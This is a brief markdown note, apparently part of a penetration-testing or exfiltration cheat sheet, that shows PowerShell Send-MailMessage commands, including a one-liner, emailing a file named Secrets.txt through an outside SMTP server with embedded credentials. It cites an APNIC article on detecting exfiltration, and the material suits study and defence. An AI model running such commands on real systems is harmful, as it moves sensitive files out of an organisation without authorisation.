# SMTP

## 01 - PowerShell

### 1.1 - Send-MailMessage

```powershell
$username = 'bob@mail.ru'
$password = ConvertTo-SecureString -String "<password>" -AsPlainText -Force
$credentials = New-Object -TypeName  System.Management.Automation.PSCredential -ArgumentList $username, $password
Send-MailMessage -From 'Bob <bob.baronov@mail.ru>' -To 'Alice <alice@mail.ru>' -Subject 'From powershell' -Body 'See attachments.' -Attachments 'C:\Tools\files\Secrets.txt' -SmtpServer 'box.mail.ru' -Credential $credentials
```

A one-liner.

```powershell
$username = 'alice@mail.ru'; $password = ConvertTo-SecureString -String "<password>" -AsPlainText -Force; $credentials = New-Object -TypeName  System.Management.Automation.PSCredential -ArgumentList $username, $password;  Send-MailMessage -From 'bob <bob@mail.ru>' -To 'Alice  <alice@mail.ru>' -Subject 'From powershell' -Body 'See attachments.' -Attachments 'C:\Tools\files\Secrets.txt' -SmtpServer 'box.mail.ru' -Credential $credentials
```

---
## References

### APNIC

- [APNIC: How to Detect and Prevent Common Data Exfiltration Attacks](https://blog.apnic.net/2022/03/31/how-to-detect-and-prevent-common-data-exfiltration-attacks/)